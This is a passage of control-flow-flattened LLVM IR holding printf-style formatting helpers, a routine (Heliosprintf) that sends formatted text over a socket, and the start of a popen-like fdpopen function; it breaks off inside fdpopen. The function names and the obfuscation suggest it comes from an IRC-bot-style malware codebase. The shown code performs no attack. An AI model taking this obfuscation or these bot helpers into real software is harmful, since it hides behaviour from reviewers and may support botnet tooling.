  %215 = load i32, i32* %7, align 4
  %216 = load i32, i32* %8, align 4
  %.reload40 = load volatile i8**, i8*** %.reg2mem39
  %217 = call i32 @printi(i8** %.reload40, i32 %214, i32 16, i32 0, i32 %215, i32 %216, i32 65)
  %218 = load i32, i32* %9, align 4
  %219 = add nsw i32 %218, %217
  store i32 %219, i32* %9, align 4
  store i32 1293602315, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %5, align 8
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 117
  %225 = select i1 %224, i32 1698354896, i32 -482398601
  store i32 %225, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i8**, i8*** %4, align 8
  store i8** %227, i8*** %.reg2mem52
  %228 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %228, %struct.__va_list_tag** %.reg2mem54
  %.reload57 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %229 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload57, i32 0, i32 0
  store i32* %229, i32** %.reg2mem58
  %.reload60 = load volatile i32*, i32** %.reg2mem58
  %230 = load i32, i32* %.reload60, align 8
  store i32 %230, i32* %.reg2mem61
  %.reload64 = load volatile i32, i32* %.reg2mem61
  %231 = icmp ule i32 %.reload64, 40
  %232 = select i1 %231, i32 1471046505, i32 337046118
  store i32 %232, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %.reload56 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %234 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload56, i32 0, i32 3
  %235 = load i8*, i8** %234, align 8
  %.reload63 = load volatile i32, i32* %.reg2mem61
  %236 = getelementptr i8, i8* %235, i32 %.reload63
  %237 = bitcast i8* %236 to i32*
  %.reload62 = load volatile i32, i32* %.reg2mem61
  %238 = add i32 %.reload62, 8
  %.reload59 = load volatile i32*, i32** %.reg2mem58
  store i32 %238, i32* %.reload59, align 8
  store i32 -1450347682, i32* %switchVar
  store i32* %237, i32** %.reg2mem88
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %.reload55 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %240 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload55, i32 0, i32 2
  %241 = load i8*, i8** %240, align 8
  %242 = bitcast i8* %241 to i32*
  %243 = getelementptr i8, i8* %241, i32 8
  store i8* %243, i8** %240, align 8
  store i32 -1450347682, i32* %switchVar
  store i32* %242, i32** %.reg2mem88
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %.reload89 = load i32*, i32** %.reg2mem88
  %245 = load i32, i32* %.reload89, align 4
  %246 = load i32, i32* %7, align 4
  %247 = load i32, i32* %8, align 4
  %.reload53 = load volatile i8**, i8*** %.reg2mem52
  %248 = call i32 @printi(i8** %.reload53, i32 %245, i32 10, i32 0, i32 %246, i32 %247, i32 97)
  %249 = load i32, i32* %9, align 4
  %250 = add nsw i32 %249, %248
  store i32 %250, i32* %9, align 4
  store i32 1293602315, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %252 = load i8*, i8** %5, align 8
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 99
  %256 = select i1 %255, i32 -85177826, i32 1753529743
  store i32 %256, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %258, %struct.__va_list_tag** %.reg2mem65
  %.reload68 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %259 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload68, i32 0, i32 0
  store i32* %259, i32** %.reg2mem69
  %.reload71 = load volatile i32*, i32** %.reg2mem69
  %260 = load i32, i32* %.reload71, align 8
  store i32 %260, i32* %.reg2mem72
  %.reload75 = load volatile i32, i32* %.reg2mem72
  %261 = icmp ule i32 %.reload75, 40
  %262 = select i1 %261, i32 -2128302247, i32 146609411
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %.reload67 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %264 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload67, i32 0, i32 3
  %265 = load i8*, i8** %264, align 8
  %.reload74 = load volatile i32, i32* %.reg2mem72
  %266 = getelementptr i8, i8* %265, i32 %.reload74
  %267 = bitcast i8* %266 to i32*
  %.reload73 = load volatile i32, i32* %.reg2mem72
  %268 = add i32 %.reload73, 8
  %.reload70 = load volatile i32*, i32** %.reg2mem69
  store i32 %268, i32* %.reload70, align 8
  store i32 559408698, i32* %switchVar
  store i32* %267, i32** %.reg2mem90
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload66 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %270 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload66, i32 0, i32 2
  %271 = load i8*, i8** %270, align 8
  %272 = bitcast i8* %271 to i32*
  %273 = getelementptr i8, i8* %271, i32 8
  store i8* %273, i8** %270, align 8
  store i32 559408698, i32* %switchVar
  store i32* %272, i32** %.reg2mem90
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %.reload91 = load i32*, i32** %.reg2mem90
  %275 = load i32, i32* %.reload91, align 4
  %276 = trunc i32 %275 to i8
  %277 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %276, i8* %277, align 1
  %278 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %278, align 1
  %279 = load i8**, i8*** %4, align 8
  %280 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %281 = load i32, i32* %7, align 4
  %282 = load i32, i32* %8, align 4
  %283 = call i32 @prints(i8** %279, i8* %280, i32 %281, i32 %282)
  %284 = load i32, i32* %9, align 4
  %285 = add nsw i32 %284, %283
  store i32 %285, i32* %9, align 4
  store i32 1293602315, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 -1310415813, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  store i32 889123824, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8**, i8*** %4, align 8
  %290 = load i8*, i8** %5, align 8
  %291 = load i8, i8* %290, align 1
  %292 = zext i8 %291 to i32
  call void @printchar(i8** %289, i32 %292)
  %293 = load i32, i32* %9, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %9, align 4
  store i32 -1310415813, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  store i32 1293602315, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load i8*, i8** %5, align 8
  %298 = getelementptr inbounds i8, i8* %297, i32 1
  store i8* %298, i8** %5, align 8
  store i32 -1592429487, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = load i8**, i8*** %4, align 8
  %301 = icmp ne i8** %300, null
  %302 = select i1 %301, i32 -10108259, i32 165995473
  store i32 %302, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i8**, i8*** %4, align 8
  %305 = load i8*, i8** %304, align 8
  store i8 0, i8* %305, align 1
  store i32 165995473, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %308 = bitcast %struct.__va_list_tag* %307 to i8*
  call void @llvm.va_end(i8* %308)
  %309 = load i32, i32* %9, align 4
  ret i32 %309

loopEnd:                                          ; preds = %303, %299, %296, %295, %288, %287, %286, %274, %269, %263, %257, %251, %244, %239, %233, %226, %220, %213, %208, %202, %195, %189, %182, %177, %171, %164, %158, %151, %146, %140, %133, %127, %121, %120, %118, %110, %105, %99, %93, %87, %84, %75, %73, %68, %62, %61, %56, %50, %49, %46, %40, %39, %33, %32, %24, %18, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1791687790, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1791687790, label %first
    i32 -1556854081, label %16
    i32 -1089458330, label %18
    i32 1743759614, label %23
    i32 -1488280050, label %26
    i32 -1952477291, label %29
    i32 916567075, label %34
    i32 437088883, label %35
    i32 2009558332, label %39
    i32 1524370881, label %44
    i32 1738019047, label %45
    i32 148480551, label %46
    i32 -1748344663, label %51
    i32 2056842223, label %52
    i32 1369880761, label %56
    i32 -2066406195, label %61
    i32 -655553162, label %64
    i32 1154826831, label %65
    i32 -1874583077, label %66
    i32 1974796598, label %71
    i32 299991449, label %78
    i32 -500600775, label %81
    i32 -1900527120, label %82
    i32 1924651892, label %86
    i32 2044659493, label %91
    i32 1713502566, label %94
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sgt i32 %.reload, 0
  %15 = select i1 %14, i32 -1556854081, i32 148480551
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  %17 = load i8*, i8** %6, align 8
  store i8* %17, i8** %12, align 8
  store i32 -1089458330, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %12, align 8
  %20 = load i8, i8* %19, align 1
  %21 = icmp ne i8 %20, 0
  %22 = select i1 %21, i32 1743759614, i32 -1952477291
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %11, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %11, align 4
  store i32 -1488280050, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i8*, i8** %12, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %12, align 8
  store i32 -1089458330, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp sge i32 %30, %31
  %33 = select i1 %32, i32 916567075, i32 437088883
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 2009558332, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub nsw i32 %37, %36
  store i32 %38, i32* %7, align 4
  store i32 2009558332, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %8, align 4
  %41 = and i32 %40, 2
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 1524370881, i32 1738019047
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 48, i32* %10, align 4
  store i32 1738019047, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 148480551, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %8, align 4
  %48 = and i32 %47, 1
  %49 = icmp ne i32 %48, 0
  %50 = select i1 %49, i32 1154826831, i32 -1748344663
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 2056842223, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = icmp sgt i32 %53, 0
  %55 = select i1 %54, i32 1369880761, i32 -655553162
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8**, i8*** %5, align 8
  %58 = load i32, i32* %10, align 4
  call void @printchar(i8** %57, i32 %58)
  %59 = load i32, i32* %9, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %9, align 4
  store i32 -2066406195, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %7, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %7, align 4
  store i32 2056842223, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 1154826831, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 -1874583077, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %6, align 8
  %68 = load i8, i8* %67, align 1
  %69 = icmp ne i8 %68, 0
  %70 = select i1 %69, i32 1974796598, i32 -500600775
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i8**, i8*** %5, align 8
  %73 = load i8*, i8** %6, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  call void @printchar(i8** %72, i32 %75)
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %9, align 4
  store i32 299991449, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %6, align 8
  %80 = getelementptr inbounds i8, i8* %79, i32 1
  store i8* %80, i8** %6, align 8
  store i32 -1874583077, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 -1900527120, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %7, align 4
  %84 = icmp sgt i32 %83, 0
  %85 = select i1 %84, i32 1924651892, i32 1713502566
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i8**, i8*** %5, align 8
  %88 = load i32, i32* %10, align 4
  call void @printchar(i8** %87, i32 %88)
  %89 = load i32, i32* %9, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %9, align 4
  store i32 2044659493, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  store i32 -1900527120, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %9, align 4
  ret i32 %95

loopEnd:                                          ; preds = %91, %86, %82, %81, %78, %71, %66, %65, %64, %61, %56, %52, %51, %46, %45, %44, %39, %35, %34, %29, %26, %23, %18, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem = alloca i32
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  store i32 %23, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1807309492, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1807309492, label %first
    i32 390914918, label %26
    i32 1458789178, label %34
    i32 -1751473319, label %38
    i32 370148409, label %42
    i32 -1705576096, label %46
    i32 -2131664763, label %49
    i32 -87472538, label %54
    i32 503071615, label %58
    i32 2117289601, label %65
    i32 -471591444, label %71
    i32 507938446, label %80
    i32 -669817557, label %84
    i32 1916581250, label %88
    i32 -530264320, label %93
    i32 -1132391873, label %99
    i32 533835469, label %102
    i32 1939070300, label %103
    i32 734901926, label %111
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %24 = icmp eq i32 %.reload, 0
  %25 = select i1 %24, i32 390914918, i32 1458789178
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %27, align 1
  %28 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %28, align 1
  %29 = load i8**, i8*** %9, align 8
  %30 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %31 = load i32, i32* %13, align 4
  %32 = load i32, i32* %14, align 4
  %33 = call i32 @prints(i8** %29, i8* %30, i32 %31, i32 %32)
  store i32 %33, i32* %8, align 4
  store i32 734901926, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i32, i32* %12, align 4
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 -1751473319, i32 -2131664763
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = icmp eq i32 %39, 10
  %41 = select i1 %40, i32 370148409, i32 -2131664763
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = icmp slt i32 %43, 0
  %45 = select i1 %44, i32 -1705576096, i32 -2131664763
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1, i32* %19, align 4
  %47 = load i32, i32* %10, align 4
  %48 = sub nsw i32 0, %47
  store i32 %48, i32* %21, align 4
  store i32 -2131664763, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %51 = getelementptr inbounds i8, i8* %50, i64 12
  %52 = getelementptr inbounds i8, i8* %51, i64 -1
  store i8* %52, i8** %17, align 8
  %53 = load i8*, i8** %17, align 8
  store i8 0, i8* %53, align 1
  store i32 -87472538, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %21, align 4
  %56 = icmp ne i32 %55, 0
  %57 = select i1 %56, i32 503071615, i32 507938446
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %21, align 4
  %60 = load i32, i32* %11, align 4
  %61 = urem i32 %59, %60
  store i32 %61, i32* %18, align 4
  %62 = load i32, i32* %18, align 4
  %63 = icmp sge i32 %62, 10
  %64 = select i1 %63, i32 2117289601, i32 -471591444
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %15, align 4
  %67 = sub nsw i32 %66, 48
  %68 = sub nsw i32 %67, 10
  %69 = load i32, i32* %18, align 4
  %70 = add nsw i32 %69, %68
  store i32 %70, i32* %18, align 4
  store i32 -471591444, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %18, align 4
  %73 = add nsw i32 %72, 48
  %74 = trunc i32 %73 to i8
  %75 = load i8*, i8** %17, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 -1
  store i8* %76, i8** %17, align 8
  store i8 %74, i8* %76, align 1
  %77 = load i32, i32* %11, align 4
  %78 = load i32, i32* %21, align 4
  %79 = udiv i32 %78, %77
  store i32 %79, i32* %21, align 4
  store i32 -87472538, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %19, align 4
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 -669817557, i32 1939070300
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = icmp ne i32 %85, 0
  %87 = select i1 %86, i32 1916581250, i32 -1132391873
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %14, align 4
  %90 = and i32 %89, 2
  %91 = icmp ne i32 %90, 0
  %92 = select i1 %91, i32 -530264320, i32 -1132391873
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %94, i32 45)
  %95 = load i32, i32* %20, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %20, align 4
  %97 = load i32, i32* %13, align 4
  %98 = add nsw i32 %97, -1
  store i32 %98, i32* %13, align 4
  store i32 533835469, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 -1
  store i8* %101, i8** %17, align 8
  store i8 45, i8* %101, align 1
  store i32 533835469, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  store i32 1939070300, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32, i32* %20, align 4
  %105 = load i8**, i8*** %9, align 8
  %106 = load i8*, i8** %17, align 8
  %107 = load i32, i32* %13, align 4
  %108 = load i32, i32* %14, align 4
  %109 = call i32 @prints(i8** %105, i8* %106, i32 %107, i32 %108)
  %110 = add nsw i32 %104, %109
  store i32 %110, i32* %8, align 4
  store i32 734901926, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %8, align 4
  ret i32 %112

loopEnd:                                          ; preds = %103, %102, %99, %93, %88, %84, %80, %71, %65, %58, %54, %49, %46, %42, %38, %34, %26, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %.reg2mem = alloca i8**
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  store i8** %5, i8*** %.reg2mem
  %switchVar = alloca i32
  store i32 -1911035301, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1911035301, label %first
    i32 452757680, label %8
    i32 -838958809, label %16
    i32 -876025010, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8**, i8*** %.reg2mem
  %6 = icmp ne i8** %.reload, null
  %7 = select i1 %6, i32 452757680, i32 -838958809
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %4, align 4
  %10 = trunc i32 %9 to i8
  %11 = load i8**, i8*** %3, align 8
  %12 = load i8*, i8** %11, align 8
  store i8 %10, i8* %12, align 1
  %13 = load i8**, i8*** %3, align 8
  %14 = load i8*, i8** %13, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %13, align 8
  store i32 -876025010, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = bitcast i32* %4 to i8*
  %18 = call i64 @write(i32 1, i8* %17, i64 1)
  store i32 -876025010, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @Heliosprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #2
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %.reg2mem4 = alloca i32
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -103536926, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 -103536926, label %first
    i32 227992776, label %15
    i32 415671261, label %21
    i32 21426558, label %28
    i32 320234309, label %29
    i32 -1105529878, label %34
    i32 -615782845, label %35
    i32 -1902564591, label %39
    i32 2075059146, label %43
    i32 -2088557560, label %44
    i32 1546163093, label %54
    i32 1804525972, label %55
    i32 31910406, label %61
    i32 1122761256, label %NodeBlock
    i32 -1567168592, label %LeafBlock1
    i32 -831375405, label %LeafBlock
    i32 -1932499248, label %66
